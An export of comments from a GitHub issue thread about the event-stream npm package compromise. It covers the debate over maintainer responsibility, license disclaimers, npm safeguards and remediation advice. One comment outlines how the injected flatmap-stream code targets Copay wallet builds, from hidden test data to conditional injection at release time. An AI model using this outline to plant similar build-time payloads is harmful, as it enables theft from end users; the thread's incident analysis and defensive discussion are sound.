The Javascript (well, and CSS sharing but less of an issue there) ecosystems seem to be perfectly fine with not only sharing, but *trusting* minified sources, which are objectively harder to audit. 

Yes of course there will always be people who put trust in non-minified sources as well, and introducing backdoors is a multifaceted issue.

But perhaps as a community the first step is to stop trusting minified sources. That way at a minimum from the user side it is partially their fault for not auditing the package. Minifiers themselves have little purpose in being minified. So if you want to run arbitrary code from a community platform, it should at least be minified by something you trust."
1662	"Hey everyone - this is not just a one off thing, there are likely to be _many_ other modules in your dependency trees that are now a burden to their authors. I didn't create this code for altruistic motivations, I created it _for fun_. I was learning, and learning is fun. I gave it away because it was easy to do so, and because sharing helps learning too. I think most of the small modules on npm were created for reasons like this. However, that was a long time ago. I've since [moved on from this module](https://www.npmjs.com/package/through) and [moved on from that thing too](https://www.npmjs.com/package/pull-stream) and in [the process of moving on from that as well](https://www.npmjs.com/package/push-stream). I've written way better modules than this, the internet just hasn't fully caught up.

@broros 
> otherwise why would he hand over a popular package to a stranger?

If it's not fun anymore, you get literally nothing from maintaining a popular package.

One time, I was working as a dishwasher in a resturant, and I made the mistake of being too competent, and I got promoted to cook. This was only a 50 cents an hour pay rise, but massively more responsibility. It didn't really feel worth it. Writing a popular module like this is like that times a million, and the pay rise is zero.

I've shared publish rights with other people before. Of course, If I had realized they had a malicious intent I wouldn't have, but at the time it looked like someone who was actually trying to help me. Since the early days of node/npm, sharing commit access/publish rights, with other contributors was a widespread community practice. https://felixge.de/2013/03/11/the-pull-request-hack.html open source is driven by sharing! It's great! it worked really well before bitcoin got popular.

So right now, we are in a weird valley where you have a bunch of dependencies that are ""maintained"" by someone who's lost interest, or is even starting to burnout, _and that they no longer use themselves_.
You can easily share the code, but no one wants to share the responsibility for maintaining that code. Like a module is like a piece of digital property, a right that can be transferred, but you don't get any benefit owning it, like being able to sell or rent it, however you still retain the responsibility.

I see two strong solutions to this problem...

1. Pay the maintainers!! Only depend on modules that you know are definitely maintained!
2. When you depend on something, you should take part in maintaining it.

Personally, I prefer the second, but the first probably has it's place.
These arn't really mutually exclusive, anyway.

As to this particular issue, I have emailed npm support and suggested that they give the module to @FallingSnow and ar @XhmikosR "
1663	"> I see two strong solutions to this problem...

> 1. Pay the maintainers!! Only depend on modules that you know are definitely maintained!
> 2. When you depend on something, you should take part in maintaining it.

@dominictarr that's a very one sided view of open source.

The third option is to audit packages and to not rely on others' minified code."
1664	I feel like there should be some kind of criminal investigation into the perpetrator.
1665	"@dominictarr How about:

3. As a package maintainer, you have a responsibility to not **completely compromise your downstreams**?

While your points have merit from your POV - I think there is a disconnect here, regarding the way you are justifying how all of this took place."
1666	"> > I feel like there should be some kind of criminal investigation into the perpetrator.
> 
> Under which countries laws and law enforcement? Something like this isn't prosecutable in court.

The theft is. Good luck laying hands on the perp though."
1667	"> @dominictarr How about:
> 
> 1. As a package maintainer, you have a responsibility to not **completely compromise your downstreams**?

This kills the open source community"
1668	"Hey everyone - this is not just a one off thing, there are likely to be _many_ other modules in your dependency trees that are now a burden to their authors. I didn't create this code for altruistic motivations, I created it _for fun_. I was learning, and learning is fun. I gave it away because it was easy to do so, and because sharing helps learning too. I think most of the small modules on npm were created for reasons like this. However, that was a long time ago. I've since [moved on from this module](https://www.npmjs.com/package/through) and [moved on from that thing too](https://www.npmjs.com/package/pull-stream) and in [the process of moving on from that as well](https://www.npmjs.com/package/push-stream). I've written way better modules than this, the internet just hasn't fully caught up.

@broros 
> otherwise why would he hand over a popular package to a stranger?

If it's not fun anymore, you get literally nothing from maintaining a popular package.

One time, I was working as a dishwasher in a resturant, and I made the mistake of being too competent, and I got promoted to cook. This was only a 50 cents an hour pay rise, but massively more responsibility. It didn't really feel worth it. Writing a popular module like this is like that times a million, and the pay rise is zero.

I've shared publish rights with other people before. Of course, If I had realized they had a malicious intent I wouldn't have, but at the time it looked like someone who was actually trying to help me. Since the early days of node/npm, sharing commit access/publish rights, with other contributors was a widespread community practice. https://felixge.de/2013/03/11/the-pull-request-hack.html open source is driven by sharing! It's great! it worked really well before bitcoin got popular.

So right now, we are in a weird valley where you have a bunch of dependencies that are ""maintained"" by someone who's lost interest, or is even starting to burnout, _and that they no longer use themselves_.
You can easily share the code, but no one wants to share the responsibility for maintaining that code. Like a module is like a piece of digital property, a right that can be transferred, but you don't get any benefit owning it, like being able to sell or rent it, however you still retain the responsibility.

I see two strong solutions to this problem...

1. Pay the maintainers!! Only depend on modules that you know are definitely maintained!
2. When you depend on something, you should take part in maintaining it.

Personally, I prefer the second, but the first probably has it's place.
These arn't really mutually exclusive, anyway.

As to this particular issue, I have emailed npm support and suggested that they give the module to @FallingSnow and ar @XhmikosR "
1669	"""it doesn't matter that i've placed attack code on thousands of peoples' machines.  i was having fun and i didn't want to press the fork button.""

there is real downstream damage to companies.  people lose jobs.

we can't have a safe community if learning lessons are turned into ""let the guy off of the hook"" instead of ""let's learn to do better in the future"""
1670	"@Augustin-FL We are discussing this because we are concerned about the security in our modules. If you do not want your inbox to fill up with our discussion, then go to [notification settings](https://github.com/settings/notifications) and uncheck ""email"" in the Participating and Watching sections.

Ironically, your comment (and thus mine) contributes less to the discussion of this issue than any of the comments in the screenshot of your inbox."
1671	it's not clear why so many people are reacting negatively to polite requests to simple steps that can prevent serious security problems without new work
1672	"it seems like maybe a lot of people here think requesting literally any behavioral change after a serious compromise is somehow a bad thing
"
1673	"I wonder what the LICENSE says here...

https://github.com/dominictarr/event-stream/blob/master/LICENCE#L18

> THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, 
> EXPRESS OR IMPLIED"
1674	"Well, fine. Then i will reply : 

> 1. As a package maintainer, you have a responsibility to not **completely compromise your downstreams**?

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

**What part of THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND don't you understand ?**

(edit : sorry, @timcharper replied before me)"
1675	"@StoneCypher While I agree that maintainers have some degree of social responsibility, it's absolutely ludicrous to outright blame them for ""causing damage to companies"".

If your company is reliant on somebody elses work, *pay them*. Stop demanding the earth from people whose work you're profiting from for free.

-----

Can we stop with the license quotes? It's been brought up and addressed a hundred times by now. We all know how the MIT license works, thank you."
1676	WHAT DID YOU DO?
1677	"@jhpratt excuse me but if this thread is locked the discussion will die out in a few days. One more ""locked thread"" after such a compromise with no outcome, and I'm just moving away from JS ecosystem"
1678	@dominictarr Thank you for having contributed so much to the OSS community over the years, which is often thankless and rewardless, as you point out. 
1679	"@jhpratt I think we shouldn't:

* We still don't know the future of this project (will it be transferred to @FallingSnow?)
* Some projects are still resolving the security issues
* We still haven't found out what `n[0]` is, other than [this little discovery](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441823345)"
1680	"> I wonder what the LICENSE says here...
> 
> https://github.com/dominictarr/event-stream/blob/master/LICENCE#L18
> 
> > THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
> > EXPRESS OR IMPLIED

see:

> I hate it when people intentionally confuse legal responsibility with social responsibility"
1681	@haykam821 It was already determined that this is code that steals Bitcoin wallets from Copay and derived forks. See further back in the discussion. If you're not using or developing on one of those, you are not affected.
1682	I hate it when people push their own responsibility onto others. (Interpret that as you see fit.)
1683	"As soon as one becomes actively part of a community, of a project, of a movement, of a cause, of an initiative, one takes on responsibilities.  Whether the reason for taking part is altruism or based on selfish motives, whether you do it for free or get paid, is irrelevant.

Anyway, tools builders should take steps in making more visible (e.g. notifications sent to all dependent projects) project ownership (and “maintainership”) changes."
1684	"As soon as one becomes actively part of a community, of a project, of a movement, of a cause, of an initiative, one takes on responsibilities.  Whether the reason for taking part is altruism or based on selfish motives, whether you do it for free or get paid, is irrelevant.

Anyway, tools builders should take steps in making more visible (e.g. notifications sent to all dependent projects) project ownership (and “maintainership”) changes."
1685	@StoneCypher put your money where your mouth is or shut up.
1686	lol
1687	"@dominictarr I would at this point in time also recommend adding a fairly no-effort third step on your part as former maintainer: go through things that you no longer (want to)maintain, and mark them as deprecated on npm using the `npm deprecate` command, as well as archiving the repo on github. Both of those things are barely any effort, the Open Source aspect remains the same (you're not ""deleting"" anything, people can still use the code if they want, they can still fork the code if they want), and without having to do anything else, everyone now gets notified that this is a dead project when they try to use it. Both npm and github in no uncertain terms will inform users for you that you moved on with your life, giving them the opportunity to find an alternative. Even if that alternative is someone's fork. Because Open Source is pretty great that way."
1688	There is a hacker1 report handled: https://hackerone.com/reports/450006 and a vulnerability added to the DB of the Node.js security working group: https://github.com/nodejs/security-wg/pull/445
1689	Thx @dominictarr for all your contribution and help for the community building greate stuff. And thx for all who helped finding and fixing this issue. Things happen, but it is greate to have such an amazing community reacting quickly. I think this is open source lived well. The world is never perfect, but we can change things to the good. Thx for your help guys. 
1690	Is there a way to get a full list of the libraries that are dependent one event-stream so we can go through and PR fixes to stop the attack from propagating further?  I [went here](https://www.npmjs.com/browse/depended/event-stream) but it is paginated so I can't really see all packages in a good way.
1691	"Isn't it a good moment to start thinking about a JS Standard Library maintained and audited by some consortium? The companies trusting unpaid maintainers, often creating projects for fun is no means to run a stable, secure business long term.

We cannot expect the maintainers to be responsible and interested in their projects if not paid! 

I work with JavaScript myself and I'm extremely put off by the lack of a proper standard library and the insane amount of libs I need to install for every project, for everything."
1692	@PWKad Try this list that @joepie91 made: https://github.com/dominictarr/event-stream/issues/116#issuecomment-441731288
1693	"@pawelngei A sanctioned list of common dependencies, overseen by an organized group of maintainers (or even core devs), would be a good idea.

I'd be very much against making it a bundled ""standard library"", though - that introduces all kinds of versioning problems."
1694	I feel like that’s one of JS’s strengths @pawelngei. There isn’t a standard library, so packages can be independently maintained and upgraded. Unlike monolithic multifunctional libraries, small packages can be maintained by individuals who deeply care about the thing the library does. That’s not to say there can’t be some sort of verification process for commonly used libraries. I agree with @joepie91’s statement that bundling a standard library with the language is a bad idea, especially because it means you can never release a breaking change again no matter how much it becomes clear an API was badly designed.
1695	Hey, @dominictarr , I volunteer to take ownership of any and all of your remaining packages.
1696	"A big part of the problem here is handing off ownership of a project to a *complete stranger*; someone who has no prior involvement in the project, has contributed not even a single bug report. Regardless of one's stance on whether the LICENSE is there to limit legal liabilities or whether it is a statement of social intent, and instead of pining for the good old days when letting strangers run off with a project had wonderful results, can people please recognize that this is **a bad practice** in the current state of the ecosystem?

I strongly recommend that @dominictarr simply follow https://github.com/dominictarr/event-stream/issues/116#issuecomment-441832148 rather than throwing the ownership of the package at a non-contributor once again."
1697	"@j-f1 in theory having small packages is a good idea. In practice it means that your dependency surfce is *required* to be extremely large. This means that you need to trust a large number of actors in your system.

I would much rather have to deal with `return` and `fail` being part of `Monad` than a package with this many users becoming actively malicious. I would much rather deal with `std::vector<bool>` being poorly-designed than have to evaluate from one of a dozen different libraries to accomplish an extremely basic task that other languages have built-in. Yes, standard libraries get cruft in them, but they tend to not become malware for weeks without anybody noticing. "
1698	"Here's a list of packages that directly depend on event-stream which I extracted by crawling npmjs.com 
[result.csv.zip](https://github.com/dominictarr/event-stream/files/2617695/result.csv.zip)
"
1699	Maybe, as a community, we could create a new package with a similar API?
1700	"@AnthonySuper A large amount of small dependencies does *not* translate to trusting a lot of authors. In particular due to 'dependency constellations' (many commonly used packages maintained by the same author, as is the case here), this is generally not true in JS.

And as described, a sanctioned package set can address the problem of trusted authors *without* needing to roll functionality into a bundled standard library. Making it a standard library provides exactly zero benefits, only drawbacks."
1701	"> 
> 
> @AnthonySuper A large amount of small dependencies does _not_ translate to trusting a lot of authors. In particular due to 'dependency constellations' (many commonly used packages maintained by the same author, as is the case here), this is generally not true in JS.
> 
> And as described, a sanctioned package set can address the problem of trusted authors _without_ needing to roll functionality into a bundled standard library. Making it a standard library provides exactly zero benefits, only drawbacks.

That works great, right up until someone invites a malicious actor into the organization and they push malicious code at 4AM."
1702	"> That works great, right up until someone invites a malicious actor into the organization and they push malicious code at 4AM.

That exact same risk exists *right now* with things maintained by Node core, and making it a bundled standard library instead of separate packages wouldn't change anything about this. It'd still be the exact same people having access."
1703	"> @AnthonySuper A large amount of small dependencies does _not_ translate to trusting a lot of authors. In particular due to 'dependency constellations' (many commonly used packages maintained by the same author, as is the case here), this is generally not true in JS.
> 
> And as described, a sanctioned package set can address the problem of trusted authors _without_ needing to roll functionality into a bundled standard library. Making it a standard library provides exactly zero benefits, only drawbacks.

It does provide benefit, though not as effectively for this particular situation.

- It provides the benefit of API predictability, meaning that a standard library would have code standards. You can reasonably predict argument formats, etc.
- **It provides the benefit of project continuity.** A large number of single-purpose APIs is a much larger organizational problem than a standard library. Generally, one person can jump around within a large library, but can only manage so many little libraries. There is no way to enforce a social contract with an unpaid maintainer.
- It encourages a legal entity. Most programmers doing solo open source projects don't consider the legal aspect of their code outside of the license. The license does not inherently indemnify someone from civil or criminal complaint, but provides a legal standing primarily for the preservation of rights. There must be the counter point - the preservation of responsibility.
- It increases code review opportunities. An organization with responsibility, sponsorship and control has a vested interest in preventing bad actors from directly committing code. Ideally, all contributors except a set of legally liable, financially compensated core maintainers should NOT be able to directly commit to prod. (See @N3X15 's comment.)

Open source is the freedom to do a lot of things. With freedom comes responsibility to do the 'right' thing, but without some instrument to enforce the 'right' thing, there can be no trust that the 'right' thing will occur.

I have a very hard time blaming @dominictarr here, because the steps are non-trivial, not perfectly clear, and not automated or enforced."
1704	"@joepie91 Can you please name a single well-maintained programming language where the core team has put malware in the standard library?

Typically standard library updates only release once every few years after an extensive review process."
1705	"@shawngmc All of the benefits you've described would be obtained with centrally-vetted-but-separately-installed modules. This does not require bundling them into core in any way.

I don't know why people seem to keep reading my comments as ""libraries shouldn't be centrally vetted"". I've been arguing the *exact opposite* the entire time. I just disagree with *bundling* them."
1706	you made the breaking news https://arstechnica.com/information-technology/2018/11/hacker-backdoors-widely-used-open-source-software-to-steal-bitcoin/
1707	"The hacker must have read this blog before 😈 
https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5"
1708	"@XhmikosR 

> You put at risk millions of people, and making something for free, but public, means you are responsible for the package.

The author of this library is not 'responsible' for anything. The license explicitly says that it does not come with any warranty, and we are not paying a cent to the author. Therefore he does not owe anything to you or anybody."
1709	"> Maybe, as a community, we could create a new package with a similar API?

Every time the conversation steers towards standards and their proliferation, this feels obligatory..
<sub><sup> - Especially when 'standards' ownership (or lack thereof) is decentralized. :homer-fade:</sup></sub>

<img title=""Fortunately, the charging one has been solved now that we've all standardized on mini-USB. Or is it micro-USB? Shit."" src=""https://imgs.xkcd.com/comics/standards.png"" />

https://xkcd.com/927/
"
1710	This thread is not beneficial towards the fix and I had to unsubscribe.  Vote to close the thread for new comments, existing comments can be edited to help with the fix this is out of hand.
1711	"@dominictarr You know what.. I was joking with my [previous comment](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441839955) but after [this](https://gist.github.com/dominictarr/9fd9c1024c94592bc7268d36b8d83b3a) I'm dead serious. I will accept the ""burden"" of any of your (or anyone else's) packages. If you are incapable of handling it responsibly, someone has to do it instead of you. Even when it's not fun anymore. It's not like you didn't get anything from the opensource code - you think anybody would invite you (and pay you) for the conferences if you didn't have these packages as a resume? How many times you used the number of downloads as a proof of your qualification? Your alibism sickens me"
1712	">  I'm extremely put off by the lack of a proper standard library 

... so, what, you want a ""standard"" library that does literally everything?  The ""standard library"" is that which comes built-in to node/browser.  You already have that.  Outside of that, you either have to write everything yourself, or rely on the reputation of other people and their packages.  It's effectively the same in every system, give or take a little bit here or there.  

Yeah, maybe this being the second major attack on a npm module in recent history that I'm aware of, maybe npm needs to improve, or someone come up with an entirely better system.
"
1713	"I can totally empathize with pretty much everyone here, buuuut....

> I will accept the ""burden"" of any of your (or anyone else's) packages. If you are incapable of handling it responsibly, someone has to do it instead of you.

let's just pretend that, god forbid, Dominic was incapacitated, and the repo was then forked by a bad actor, who then submitted it to npm, took over completely, everyone switched over to that, and then months down the road, swapped in the bad code, exactly like what was done now.  Pretend that Dominic wasn't directly involved in handing it over, and in fact, was absolutely incapable of handling it.  How do you feel in that case?

"
1714	"> lagovens doesn’t have any public repositories yet.


So why should project be transfer to you? You are claiming better solution is same solution. Give the project to someone lacking any verifiable trust. 
Maybe dismount high horse?"
1715	@promoderates that's the point. I opened this account just to write the first comment to make it more obvious that handing over the ownership to a total stranger is a very irresponsible thing to do. Dominic seems to ignore this and instead talks about unpaid work. Well guess what, I can mark packages as abandoned even for free. Besides I have 10 years of web programming experience, but who cares
1716	"Before you comment here, think your way through these questions:

* If you were this developer, how would you feel about the comment you're about to leave?
* What do you think your comment will add to the conversation?
* How will it aid in making this situation better?

He did something that some might consider to not be the smartest thing, but we've all screwed up. Think it through before you flame. I get it, you're mad. But being piled on sucks and doesn't help."
1717	"@ericblade:

> let's just pretend that, god forbid, Dominic was incapacitated, and the repo was then forked by a bad actor, who then submitted it to npm, took over completely, everyone switched over to that, and then months down the road, swapped in the bad code, exactly like what was done now. Pretend that Dominic wasn't directly involved in handing it over, and in fact, was absolutely incapable of handling it. How do you feel in that case?

Doesn't switching over to a new fork involve substantially more action from the end-user, than in the case at hand, in which the original/canonical repo has a new owner? 
"
1718	"Let's just leave it at ""Mistakes were made""..."
1719	"> Besides I have 10 years of web programming experience, but who cares

@lagovens Or maybe more. Or maybe none. Or maybe you are a cat. Or maybe 10 years of forking projects and inserting malware. Or maybe creator is half sentient supercomputer so no moral responsibility. Or maybe creator is a cat.

Or maybe we stop complaining and agree: Mistakes were made. You made a mistake (maybe). Creator made a mistake (probably). I made mistakes (definitely). Npm contains other mistakes (undoubtedly). 

Let's forgive creator for unknown unknowns and move on."
1720	"> Doesn't switching over to a new fork involve substantially more action from the end-user, than in the case at hand, in which the original/canonical repo has a new owner?

It does, but if the bad actor took a bit of time to convince the world that they were not a bad actor, and that they were legitimate, as it appears was attempted to do so, sometime down the road, they could easily pick up a bunch of users, and then do the exact same thing. 

Yes, Dominic shouldn't have done the Bad Thing here, but even without the Bad Thing having happened, the rest of the chain of Bad Things could have happened, just as well (albeit slower).  

I've been bugging a project maintainer to provide proper publishing instructions for a library that I've recently become a contributor on, so that we can keep moving on with it, despite the maintainer not wanting to be involved anymore.. and this situation certainly won't help my case. :-D

Let's not pile on Dominic here.  Let's fix the immediate problem, and find ways to try to prevent things like this from occurring.  Given NPM's total openness, though, i find it a bit difficult to believe that there's only been 2 major package high-jackings that have been reported.  Makes me wonder how many more are out there.  Add to that, that there was an incident a while back where someone attempted to wipe out their own high profile package... that all went over superbly too.
"
1721	"Idea for NPM team: Implement warning (ask for confirmation before downloading?), if NPM package changes owner

edit:
or have something like ""verified version"", where bunch of people would have to mark that version as ""ok"" or i guess even verified users could be a thing"
1722	"@wUFr might help if people understood npm warnings better

For example, lots of confusion around the `fsevent` warning, https://stackoverflow.com/questions/46929196/how-to-solve-npm-install-throwing-fsevents-warning-on-non-mac-os/47071650"
1723	Follow-up to my previous comment: I created [haykam821/Streamed-Events](https://github.com/haykam821/Streamed-Events), which is heavily based off this package. @dominictarr, do you think this is good as an alternative to your abandoned project?
1724	"After some further investigation, it looks like the intended target is to run the final payload on end user devices that use the copay library. If you have event-stream as a dependency but never load copay, you aren't affected. 

How it works in a nutshell:

1. Loads malicious code from `flatmap-stream/test/data.js`

2. Puts malicious code into `./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js` when npm is run with a command matching the regex `/build\\:.*\\-release/`

3. Malicious code is delivered in compiled copay library to end user devices (websites, mobile phones, etc)

Obviously if you are using the affected version, you should remove or change it. But the attacker's biggest mistake was using `crypto.createDecipher` instead of `crypto.createDecipheriv`, had they used createDecipheriv, who knows how long this would've gone on without anyone noticing."
1725	 He is just a whipping boy in this accident! 
1726	"> Follow-up to my previous comment: I created [haykam821/Streamed-Events](https://github.com/haykam821/Streamed-Events), which is heavily based off this package. @ dominictarr, do you think this is good as an alternative to your abandoned project?

if you want to promote this, at least, create a decent readme."
1727	"https://gist.github.com/cometkim/e1d52167d8965c07f45e27b02bfa682c

A temporary solution for this, put some script into postinstall remove the vulnerability."
1728	NPM already [removed the package](http://npmjs.com/package/flatmap-stream). It seems that the vulnerable version is flatmap-stream@0.1.1, not flatmap-stream@0.1.0. If you have 0.1.0 you're fine.
1729	People like @XhmikosR and others, stop attacking/bullying @dominictarr . Maybe think of donating instead. You're all making money off someone else's work and expect him to be responsible even after he quit the project. 
1730	"Just wondering whether is this his first attack or he already mastered it . Picking up project and injecting code with new GitHub account. I think someone from GitHub should check whether this part of code replicated in other Github repos (or track the ip-address of attacker if possible) - just to be 100% safe. 
"
1731	"It's frustrating and worrying when things like this happen, but attacks on @dominictarr are not appropriate. It can be hard to manage open source projects, many of us have only limited free time to do it. Most people are just sharing code because they think it is better for the wider community to be able to see it, use it and learn from it.

To those who are talking about responsibility of the author, please remember he *has* been responsible. He has used the MIT License, explicitly and legally indicating he cannot provide any liability or warranty. He doesn't have a responsibility to fix it, however much we might want that, it is *us* who have a responsibility to understand the risk when using open source, unprotected code.

It's difficult when we face issues like this but let's keep it civil and try and solve the problems, rather than being confrontational with someone who was just doing what many of us do - wanting to share the interesting stuff they've been using."
1732	"> You put at risk millions of people, and making something for free, but public, means you are responsible for the package.
> 
> Anyway, I don't want to argue about this, I just want the issue to be solved, because this is a popular package.

@XhmikosR That isn't correct. *You* are responsible for checking on the content of the release when you upgrade your dependencies. 

Publishers of open source code do not have any kind of responsability towards anyone out there just using the software (and apparently not even bothered to check on the content of a release before running a version upgrade on it). As popular licenses state: no warranty. 

And on the tone of `I just want the issue to be solved`, here is a good one on that.: https://gist.github.com/richhickey/1563cddea1002958f96e7ba9519972d9

If you are using a software or other system that relies on some public code repository and/or online binary archive or publish-registry of any sort in a way where you are not in control anymore of what version is exactly built or run for your case, then that is a problem that *you* should definitely fix in the first place.

Sure a maintainer *could* have done something about checking twice who he is giving write/publish priviliges etc. But that was neither the job of the maintainer here, nor did he promise to anyone in the first place that he will be guaranteeing your safety in using this package until eternity. 


"
1733	"Yes, I'll totally search through all 1,296 sub-dependencies when I need to update one of my direct dependencies.

Get your heads out of your rears, that's not a realistic demand to make with NPM packages."
1734	"@N3X15 I guess you have never heard of the file generated by npm called `package-lock.json` then? :)

But yes sure, I understand that the way deps are nested in certain projects, this exploit might have spread into many upgrades that ran at the time where the package was public. That is definitely another problem there in the way that npm packages are consumed, how publish priviliges can be transferred (that should definitely yield at least a warning when installing that at first or so), etc. I was however more being critical of the ""you published it so fix it"" culture. That isn't how it works.

There is something I need to add here. Being myself a co-maintainer of more or less popular used JS libraries what I know is that all the people I work with on these projects and myself are with every commit concerned about impacts it will have for *all* users, and to make sure new features aren't breaking any use cases for others. But that is because we chose to maintain the project and we give it our time and energy because we enjoy the exchange of ideas and solutions as much as the fact that we are actually helping with such a widespread solution - and finally because that is also what in part we make our living off or build companies and products upon. But that is our decision to drive a software project in this way because we make it our mission. If someone decides it is not profitable or enjoyable in a way anymore to maintain a project then there is no absolutely no responsability to do that. 

Of course we are all concerned with the usefulness and the impact of our work and what other people might rely on. But on the other side people need to consume whatever comes out of these projects with their own responsability and cautiousness."
1735	"> 
> 
> @N3X15 I guess you have never heard of the file generated by npm called `package-lock.json` then? :)

Yes, that gives you names, but doesn't give you the ability to scan 1,296 packages' code with your Mark 1 Eyeballs like you seem to be implying is *so easy*."
1736	"Or, you know, we could just all stop using single&#x2011;function dependencies like every other sane programming language, _but&nbsp;no_, the snowflakes programming in&nbsp;JavaScript keep repeating the same mistakes over and over and this is&nbsp;the&nbsp;result.

Have we learned nothing from <code>left&#x2011;pad</code>?

## See also:
- https://www.reddit.com/r/programmingcirclejerk/comments/9nh59c/big_brain_webshit_explains_how_removing_1_line/
- https://github.com/moxystudio/node-cross-spawn/pull/102"
1737	@N3X15 sure, but that wasn't my point. see my edit above.
1738	"> To know if your project is in danger, run:
> 
> ```
> npm ls event-stream flatmap-stream
> ```
> The bad actor has publishing rights to `event-stream` and `flatmap-stream` contains the malicious code (specifically `flatmap-stream@0.1.1`, but any future version can't be trusted).
> 
> Here is an example result from one of my projects:
> 
> ```
> [redacted]
> └─┬ npm-run-all@4.1.3
>   └─┬ ps-tree@1.1.0
>     └─┬ event-stream@3.3.6
>       └── flatmap-stream@0.1.2
> ```

I have the same result as you! But I had developed the react project, is that influenced?"
1739	"> Or, you know, we could just all stop using single‑function dependencies like every other sane programming language, _but no_, the snowflakes programming in JavaScript keep repeating the same mistakes over and over and this is the result.

This. Stop putting yourselves in that position. Have some self control and don't use as many packages as your harddrive allows. "
1740	"In your opinion, copay multisig wallets are safe?
I think the application has access to only one key (seed)."
1741	"Since we're pointing fingers I'd like to remind everyone that any greater community like node's will always follow the path of least resistance that they are familiar with. With that in mind we can't pile the blame on using small packages, giving away a package to another maintainer, or running `npm install` without doing your own security audit. The system itself needs to be designed around security without these weak points.

A package manager which only retrieves audited packages on `install` is how to fix it. If a package hasn't been audited it can ask you to audit it for yourself first or use a flag to ignore it with a big warning every time it runs. The only weak point then becomes the auditing authority, which can be strengthened to the best of our ability, or use an option to replace internally within your organization with your own.

A short-term solution might be to make a package that monkey-patches `Module.prototype.require` to check an authority which whitelists packages, stopping the program during runtime with en error. `npm audit` uses npmjs.com/advisories which only blacklists."
1742	"Imagine a volunteer lifeguard decides one day to leave his post because he is no longer interested with the work. One of his responsability is to let his supervisor know of his intention and to have the supervisor pick someone qualified to replace him. This is an implicit responsability.

A repo owner has similar responsibilities. He should be responsible for transferring ownership to a suitable person, to the best of his judgement and knowledge. Deciding who is suitable may not be obvious. So I’m not laying the blame entirely on the former owner of this repo. But transferring ownership just because someone asked is demonstration of bad jugdement and a failure in responsability. Of course, there is no liability, nor guarantee, nor many of the legal bindings with open source software. But if we want this community to flourish and improve further, every actor should try to exercise good judgement and feel responsible for how he/she shares, leaves or transfers code. Asking for payment as an incentive for one to adhere to these principles is contrary to the spirit of open source software. 

  "
1743	Yes, repo owner failed at a responsibility, but all I’m reading is ppl blaming him for like, everything! Where is the hate for the ACTUAL hacker? It’s so weird that no one says much about the CRIMINAL but they pile on endlessly about this poor guy who just wanted off the job and carelessly picked a replacement. Let’s try to remember we all have social responsibilities, but the ppl who behave criminally are the ones we should seek to punish. Any of us could fall into this trap. What will you do when someone offers you help in the future? When you don’t have much recourse into checking backgrounds, you might trust someone. It’s the person who betrays the trust that deserves our wrath. Leave off the former owner. Please.
1744	"> Yes, repo owner failed at a responsibility

No. NPM failed, utterly and miserably at everything it aims to do. They allowed this to happen. I posted some ideas over at node (and the issue got closed).

NPM should have required human intervention _at some point_ or at least triggered an automated system due to the fact a new account uploads a new module and suddenly owns a popular repo.

So many red flags, NPM missed them _all_.

This was a great public demonstration at how utterly useless NPM is at security."
1745	"As something of an outsider to the NPM community, might I recommend the practice of vendoring.  Check in your `node_modules` folder to your master application project, then as you `npm update` or whatever over time, see what changes.  Make your CI builds just build against what's in the repo, not fetch for every build.  Get crafty with `.gitignore`.  Make [clean and smudge filters](https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes) if you need to to avoid churn of changes that don't need to be checked in.

If you do that, the changes to your dependencies also become changes in your application.  You might find yourself reviewing those changes more.  Remember, for open source to work - you need many eyeballs.  It's much better to spend time reading code changes than it is to look at some finely crafted UTF-8 ANSI art-esque spinner.

Vendoring is about ownership of code - if you're incorporating a piece of code into yours, you are adopting it.  So make it your own.  Really make sure you understand it.

My 2¢!"
1746	...could we get this thread locked and limited to collaborators? Now that the issue has been thoroughly well-researched (and given some [press coverage](https://arstechnica.com/information-technology/2018/11/hacker-backdoors-widely-used-open-source-software-to-steal-bitcoin/), it seems like this thread is going around in circles and not producing valuable discussion.
1747	Yeah, just lock this issue.
1748	I realized that there are more bad things, will there be others doing dangerous things in module???
1749	Enterprise development processes require more disciplined operational processes, especially those involving personal property.
1750	If we are dealing with sensitive data, as consumers of OSS, we are supposed to be very careful. An app dealing with sensitive data like Bitpay should have had pretty strict Content Security Policies. If it had this, even malicious code would not be able to send data to any unknown server.
1751	"> Enterprise development processes require more disciplined operational processes, especially those involving personal property.

Indeed, see npm Enterprise: https://npme.npmjs.com/docs/workflow/whitelisting.html"
1752	"It is interesting to be able to look at the commit in copay that introduced the malicious package: https://github.com/bitpay/copay/commit/6cc4b757f6fbd111b9716b50d645390dd1f15105#diff-b9cfc7f2cdf78a7f4b91a753d10865a2R232

There was only one simple change in their dev-dependencies where they manually downgraded something electron related. But that has been done by running a plain `npm install` most likely, as flatmap-stream came up suddenly, and that was because then some sub-dependency without version locking had event-stream in it :) And then the package-lock rewrite just wasn't looked at too closely because well, we did change something about electron, so who knows, right?

Not looking at that too closely is something that could happen to any developer in many projects and companies out there I think, given the craps not given about the security risks of npm. But it shouldn't happen to an org that you want to trust.

"
1753	"@tchakabam From my experience, [pnpm](https://pnpm.js.org) only updates or downgrades the dependencies and sub-dependencies of the package passed to <code>pnpm&nbsp;update</code> or <code>pnpm&nbsp;install</code>.

/cc @zkochan"
1754	"`npm ERR! code E404`
`npm ERR! 404 Not Found: flatmap-stream@https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz`

`npm ERR! A complete log of this run can be found in:`
